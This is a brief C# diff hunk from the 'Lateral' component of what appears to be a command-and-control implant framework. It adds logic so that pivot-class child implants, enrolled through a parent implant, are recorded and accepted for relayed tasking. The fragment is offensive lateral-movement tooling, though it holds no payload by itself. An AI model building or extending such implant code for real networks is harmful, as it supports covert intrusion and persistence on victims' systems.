@@ -62,6 +62,13 @@ internal static class Lateral
             // (architecture.md Sec 10.1).
             var enrolled = await C2.EnrollAsync(
                 enroll.Url, token, enroll.ParentId, childKey, enroll.CAs, enroll.Profile, requestedClass);
+            // A Pivot-class child has no process of its own (architecture.md
+            // Sec 5.2): its tasking will arrive on this implant's stream marked
+            // with the child's id, and the fronting gate accepts only children
+            // recorded here -- the enrollment this implant performed is the
+            // voucher.
+            if (string.Equals(requestedClass, "Pivot", StringComparison.OrdinalIgnoreCase))
+                enroll.Fronted.Record(enrolled.ImplantId);
             // Report the child id so the operator can confirm the recorded lineage.
             // The server echoes the parent back, so include it when present as an
             // independent confirmation the linkage landed.
